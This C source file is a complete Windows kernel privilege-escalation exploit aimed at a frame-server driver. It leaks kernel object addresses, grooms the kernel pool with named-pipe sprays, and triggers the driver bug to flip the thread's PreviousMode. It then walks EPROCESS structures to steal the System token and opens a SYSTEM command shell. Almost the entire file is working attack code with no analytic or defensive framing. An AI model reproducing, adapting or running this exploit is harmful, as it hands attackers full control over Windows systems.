#include <stdio.h>
#include "Types.h"

#define IOCTL_FRAMESERVER_INIT_CONTEXT 0x2f0400
#define IOCTL_FRAMESERVER_PUBLISH_RX   0x2f040c
#define FSCTL_CODE                     0x119ff8

#define SPRAY_SIZE 0x10000
#define PIPESPRAY_SIZE 0x80
#define PAYLOAD_SIZE 0x80

#define DEVICE_NAME  "\\\\?\\root#system#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96e080c7-143c-11d1-b40f-00a0c9223196}&{3c0d501a-140b-11d1-b40f-00a0c9223196}"

PHANDLE phPipeHandleArray[sizeof(HANDLE) *SPRAY_SIZE];
PHANDLE phFileArray[sizeof(HANDLE) * SPRAY_SIZE];

PHANDLE phPipeHandleArray2[sizeof(HANDLE) *SPRAY_SIZE];
PHANDLE phFileArray2[sizeof(HANDLE) * SPRAY_SIZE];

HANDLE hDevice = INVALID_HANDLE_VALUE;

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVirtualMemory;

PVOID KTHREAD = NULL;
PVOID EPROCESS = NULL;
PVOID SYSTEM_EPROCESS = NULL;
PVOID FILE_OBEJCT = NULL;

void ResolveNtFunctions() {
	pNtFsControlFile = (_NtFsControlFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFsControlFile");

	if (!pNtFsControlFile)
	{
		printf("[!] Error while resolving NtFsControlFile: %d\n", GetLastError());
		exit(1);
	}

	pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

	if (!pNtQuerySystemInformation)
	{
		printf("[!] Error while resolving NtQuerySystemInformation: %d\n", GetLastError());
		exit(1);
	}

	pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");

	if (!pNtWriteVirtualMemory)
	{
		printf("[!] Error while resolving NtWriteVirtualMemory: %d\n", GetLastError());
		exit(1);
	}

	pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");

	if (!pNtReadVirtualMemory)
	{
		printf("[!] Error while resolving NtReadVirtualMemory: %d\n", GetLastError());
		exit(1);
	}
}

PVOID GetkThread()
{
	NTSTATUS nt_status;
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread)
	{
		printf("[!] Error while getting the thread ID: %d\n", GetLastError());
		exit(1);
	}

	ULONG system_handle_info_size = 4096;
	PSYSTEM_HANDLE_INFORMATION system_handle_info = (PSYSTEM_HANDLE_INFORMATION)malloc(system_handle_info_size);
	memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((nt_status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 10);
		if (system_handle_info == NULL)
		{
			printf("[!] Error while allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			exit(1);
		}
	}
	if (nt_status != 0x0)
	{
		printf("[!] Error while calling NtQuerySystemInformation to obtain the SystemHandleInformation.\n");
		exit(1);
	}

	int z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
		{
			if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
			{
				z++;
			}
		}
	}

	int array_size = z - 1;
	PVOID* kThread_array = (PVOID*)malloc(array_size * sizeof(PVOID));
	z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
		{
			if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
			{
				kThread_array[z] = system_handle_info->Handles[i].Object;
				z++;
			}
		}
	}

	printf("[+] KTHREAD address: %p\n", kThread_array[array_size]);
	return kThread_array[array_size];

}

PVOID GetFILE_OBJECT()
{
	NTSTATUS nt_status;
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread)
	{
		printf("[!] Error while getting the thread ID: %d\n", GetLastError());
		exit(1);
	}

	ULONG system_handle_info_size = 4096;
	PSYSTEM_HANDLE_INFORMATION_EX system_handle_info = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(system_handle_info_size);
	memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((nt_status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 10);
		if (system_handle_info == NULL)
		{
			printf("[!] Error while allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			exit(1);
		}
	}
	if (nt_status != 0x0)
	{
		printf("[!] Error while calling NtQuerySystemInformation to obtain the SystemExtendedHandleInformation.\n");
		exit(1);
	}

	// Iterate through the handles untill we find the handle equal to hDevice
	for (unsigned int i = 0; i < system_handle_info->HandleCount; i++)
	{
		if ((HANDLE)system_handle_info->Handles[i].HandleValue == hDevice)
		{
			return system_handle_info->Handles[i].Object;
		}
	}

}

void PipeSpray(void* payload, int size) {

	IO_STATUS_BLOCK isb;
	OVERLAPPED ol;

	for (int i = 0; i < SPRAY_SIZE; i++) {
		phPipeHandleArray[i] = CreateNamedPipe(L"\\\\.\\pipe\\testpipe", PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, size, size, 0, 0);

		if (phPipeHandleArray[i] == INVALID_HANDLE_VALUE) {
			printf("[!] Error while creating the named pipe: %d\n", GetLastError());
			exit(1);
		}

		memset(&ol, 0, sizeof(ol));
		ol.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (!ol.hEvent) {
			printf("[!] Error creating event: %d\n", GetLastError());
			exit(1);
		}

		phFileArray[i] = CreateFile(L"\\\\.\\pipe\\testpipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

		if (phFileArray[i] == INVALID_HANDLE_VALUE) {
			printf("[!] Error while opening the named pipe: %d\n", GetLastError());
			exit(1);
		}

		NTSTATUS ret = pNtFsControlFile(phPipeHandleArray[i], 0, 0, 0, &isb, FSCTL_CODE, payload, size, NULL, 0);

		// Print the return value of NtFsControlFile
		//printf("[+] NtFsControlFile return value: %p\n", ret);

		if (ret == STATUS_PENDING) {
			DWORD bytesTransferred;
			if (!GetOverlappedResult(phFileArray[i], &ol, &bytesTransferred, TRUE)) {
				printf("[!] Overlapped operation failed: %d\n", GetLastError());
				exit(1);
			}
		}
		else if (ret != 0) {
			printf("[!] Error while calling NtFsControlFile: %p\n", ret);
			exit(1);
		}
				
		CloseHandle(ol.hEvent);
	}

}

void CreateHoles() {
	for (int i = 0; i < SPRAY_SIZE; i += 4)
	{
		CloseHandle(phPipeHandleArray[i]);
		CloseHandle(phFileArray[i]);
	}
}

void AllocateContext() {

	MY_IRP inbuff = { 0 };

	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Type = 1;
	inbuff.Flags = 0x000000136FE7474D;
	inbuff.val20 = 0x4141414141414141;

	hDevice = CreateFileA("\\\\?\\root#system#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96e080c7-143c-11d1-b40f-00a0c9223196}&{3c0d501a-140b-11d1-b40f-00a0c9223196}", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, 0, NULL);

	DeviceIoControl(hDevice, IOCTL_FRAMESERVER_INIT_CONTEXT, &inbuff, sizeof(MY_IRP), NULL, 0, NULL, NULL);
}

void FillHoles(void* payload, int size) 
{
	IO_STATUS_BLOCK isb;
	OVERLAPPED ol;

	for (int i = 0; i < SPRAY_SIZE; i++) {
		phPipeHandleArray2[i] = CreateNamedPipe(L"\\\\.\\pipe\\testpipe", PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, size, size, 0, 0);

		if (phPipeHandleArray[i] == INVALID_HANDLE_VALUE) {
			printf("[!] Error while creating the named pipe: %d\n", GetLastError());
			exit(1);
		}

		memset(&ol, 0, sizeof(ol));
		ol.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (!ol.hEvent) {
			printf("[!] Error creating event: %d\n", GetLastError());
			exit(1);
		}

		phFileArray2[i] = CreateFile(L"\\\\.\\pipe\\testpipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

		if (phFileArray2[i] == INVALID_HANDLE_VALUE) {
			printf("[!] Error while opening the named pipe: %d\n", GetLastError());
			exit(1);
		}

		NTSTATUS ret = pNtFsControlFile(phPipeHandleArray2[i], 0, 0, 0, &isb, FSCTL_CODE, payload, size, NULL, 0);

		if (ret == STATUS_PENDING) {
			DWORD bytesTransferred;
			if (!GetOverlappedResult(phFileArray[i], &ol, &bytesTransferred, TRUE)) {
				printf("[!] Overlapped operation failed: %d\n", GetLastError());
				exit(1);
			}
		}
		else if (ret != 0) {
			printf("[!] Error while calling NtFsControlFile: %p\n", ret);
			exit(1);
		}

		CloseHandle(ol.hEvent);

	}

}

void triggerExploit() {

	
	MY_IRP inbuff = { 0 };

	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Type = 1;
	inbuff.Flags = 0x000000136FE7474D;
	inbuff.val20 = 0x0000000100000001;

	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_FRAMESERVER_PUBLISH_RX, &inbuff, 0x100, NULL, 0, &bytesReturned, NULL);

}

void CleanUp() {
	for (int i = 0; i < SPRAY_SIZE; i++)
	{
		CloseHandle(phPipeHandleArray[i]);
		CloseHandle(phFileArray[i]);
	}

	for (int i = 0; i < SPRAY_SIZE; i++)
	{
		CloseHandle(phPipeHandleArray2[i]);
		CloseHandle(phFileArray2[i]);
	}

	CloseHandle(hDevice);
}


int main() {

	ResolveNtFunctions();

	KTHREAD = GetkThread();
	EPROCESS = (ULONG64)KTHREAD +0x220;

	printf("[+] EPROCESS pointer is: %p\n", EPROCESS);

	ULONG64 PreviousMode = (ULONG64)KTHREAD + 0x232;
	ULONG64 pmode = PreviousMode+0x30;

	printf("[+] PreviousMode pointer: %p\n", PreviousMode);

	PULONGLONG buf = VirtualAlloc((LPVOID)0x00000001a0000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!buf)
	{
		printf("[!] Error while allocating memory for the user buffer: %d\n", GetLastError());
		exit(1);
	}

	memset((LPVOID)buf, 0x0, 0x1000);

	buf[0] = 0x00000001a0000000; // Linked list pointer
	buf[11] = 0x00000001a0000000;
	buf[26] = 0x0000000000000001; // Bypass rbx check in FSStreamReg::PublishRx

	void *spray_payload = malloc(PAYLOAD_SIZE);

	// Place previous mode address+0x30 at offset 0x18
	memcpy((PVOID*)((ULONG64)spray_payload+0x18), &pmode, 0x8); // Offset 0x1c8 of object
	
	// Reference user-mode buf as linked list
	memcpy((PVOID*)((ULONG64)spray_payload+0x20), &buf, 0x8); // Offset 0x140 of object
	memcpy((PVOID*)((ULONG64)spray_payload+0x68), &buf, 0x8); // Offset 0x188 of object
	memcpy((PVOID*)((ULONG64)spray_payload+0x78), &buf, 0x8); // Offset 0x198 of object


	// Spray the pool with named pipes
	printf("[+] Spraying the pool with pipes...\n");
	PipeSpray(spray_payload, PIPESPRAY_SIZE);
	
	// Create holes in the pool
	printf("[+] Creating holes in the pool...\n");
	CreateHoles();
	
	// Allocate context registration
	printf("[+] Allocating context registration...\n");
	AllocateContext();
	
	// Fill holes with our payload
	printf("[+] Re-filling holes...\n");
	FillHoles(spray_payload, PIPESPRAY_SIZE);

	// Locate our FILE_OBJECT
	printf("[+] Locating our FILE_OBJECT...\n");
	FILE_OBEJCT = GetFILE_OBJECT();
	printf("[+] FILE_OBJECT address: %p\n", FILE_OBEJCT);

	// Execute trigger function in a separate thread
	printf("[+] Executing trigger function in a separate thread...\n");
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)triggerExploit, NULL, 0, NULL);

	Sleep(2000);

	// Locate EPROCESS of System and overwrite our token with the System token
	LPVOID read_qword = malloc(sizeof(ULONGLONG));
	SIZE_T read_bytes;
	memset(read_qword, 0x00, sizeof(ULONGLONG));

	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)EPROCESS), read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}

	PLONGLONG eprocess = (PULONGLONG)((ULONG_PTR*)read_qword);

	ULONGLONG ourEprocess = (ULONGLONG)*eprocess;
	printf("[+] Our EPROCESS: 0x%llx\n", *eprocess);

	ULONGLONG nEprocess = *eprocess;

	printf("[+] Looking for system PID\n");
	while (TRUE)
	{
		nEprocess = nEprocess + 0x448;
		memset(read_qword, 0x00, sizeof(ULONGLONG));
		if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)nEprocess), read_qword, sizeof(ULONGLONG), &read_bytes))
		{
			printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
		}
		PULONGLONG nEprocessPtr = (PULONGLONG)((ULONG_PTR*)read_qword);
		ULONGLONG nEprocessPtrValue = (ULONGLONG)*nEprocessPtr - 0x448;
		//printf("[+] Found next EPROCESS: 0x%llx\n", nEprocessPtrValue);

		ULONGLONG UniqueProcessIdAddr = nEprocessPtrValue + 0x440;
		//printf("[+] Found next UniqueProcessId address: 0x%llx\n", UniqueProcessIdAddr);

		memset(read_qword, 0x00, sizeof(ULONGLONG));
		if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)UniqueProcessIdAddr), read_qword, sizeof(ULONGLONG), &read_bytes))
		{
			printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
		}

		PULONGLONG UniqueProcessId = (PULONGLONG)((ULONG_PTR*)read_qword);
		//printf("[+] Found next UniqueProcessId: 0x%llx\n", *UniqueProcessId);


		nEprocess = nEprocessPtrValue;

		if (*UniqueProcessId == 0x0000000000000004)
		{
			printf("[!] System EPROCESS found at: %llx\n", nEprocess);
			break;
		}

	}

	// Overwrite our Token with the System token
	printf("[+] Overwritting our token...\n");
	ULONGLONG sysToken = nEprocess + 0x4b8;
	ULONGLONG eprocessToken = ourEprocess + 0x4b8;

	memset(read_qword, 0x00, sizeof(ULONGLONG));
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)sysToken), read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}

	PULONGLONG systemToken = (PULONGLONG)((ULONG_PTR*)read_qword);
	pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)eprocessToken, systemToken, sizeof(ULONGLONG), NULL);
			
	// Read offset 0x20 of FILE_OBJECT to get Context registration pointer
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)FILE_OBEJCT + 0x20), read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}

	PULONGLONG pFILE_OBJECT = (PULONGLONG)((ULONG_PTR*)read_qword);
	ULONGLONG pCreg = (ULONGLONG)*pFILE_OBJECT;

	printf("[+] pCreg address: %p\n", pCreg);

	PLONGLONG pProcessBilled = pCreg + 0x1a8;

	// Read process billed value
	memset(read_qword, 0x00, sizeof(ULONGLONG));
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)pProcessBilled), read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}

	PULONGLONG pProcessBilledValue = (PULONGLONG)((ULONG_PTR*)read_qword);
	ULONGLONG ProcessBilledValue = (ULONGLONG)*pProcessBilledValue;

	// Overwrite process billed value with NULL
	printf("[+] Overwritting process billed value...\n");
	ULONGLONG nullQWORD = (ULONGLONG)0x0000000000000000;
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)pProcessBilled), &nullQWORD, sizeof(ULONGLONG), NULL);

	Sleep(1000);

	// Break out of the trigger thread
	buf[0] = 0x0000000000000000;

	Sleep(2000);

	// Restore process billed value
	printf("[+] Restoring process billed value...\n");
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)pProcessBilled), &ProcessBilledValue, sizeof(ULONGLONG), NULL);

	Sleep(2000);

	// Increment Ref count of SYSTEM EPROCESS token
	printf("[+] Incrementing ref count of EPROCESS token...\n");
	ULONGLONG refCount = ourEprocess-0x30;
	ULONGLONG refCountValue = (ULONGLONG)0x4141414141414141;
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)refCount), &refCountValue, sizeof(ULONGLONG), NULL);	
	
	Sleep(2000);

	// Restore PreviousMode
	printf("[+] Restoring PreviousMode...\n");
	memset(read_qword, 0x00, sizeof(ULONGLONG));
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)PreviousMode), read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError());
	}
	PULONGLONG kThreadPM = (PULONGLONG)((ULONG_PTR*)read_qword);
	ULONGLONG write_what = (ULONGLONG)*kThreadPM ^ 1 << 0;
	pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)((ULONGLONG)PreviousMode), &write_what, sizeof(ULONGLONG), NULL);

	// Spawn a shell
	Sleep(500);
	system("start cmd.exe");
	printf("[+] Check for SYSTEM shell!...\n");
	
	Sleep(1000);

	printf("[+] Cleaning up...\n");
	CleanUp();
	printf("[+] Done!\n");

	Sleep(1000);
	return 0;
}
